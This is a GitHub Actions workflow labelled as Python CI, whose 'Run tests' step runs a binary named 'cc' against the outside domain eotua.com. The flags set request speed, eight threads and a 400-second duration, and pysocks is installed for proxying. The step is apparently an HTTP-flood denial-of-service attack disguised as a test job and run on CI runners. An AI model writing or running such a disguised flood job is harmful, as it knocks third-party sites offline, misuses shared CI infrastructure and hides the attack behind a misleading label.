name: CI â€” Python

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python 3.10
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install requests pysocks

      - name: Run tests
        run: |
          chmod 777 cc
          ./cc -url=eotua.com -speed=100 -thread=8 -timeout=2500 -time=400 -http_methods 'GET' -cookie='test=cookievalue;'
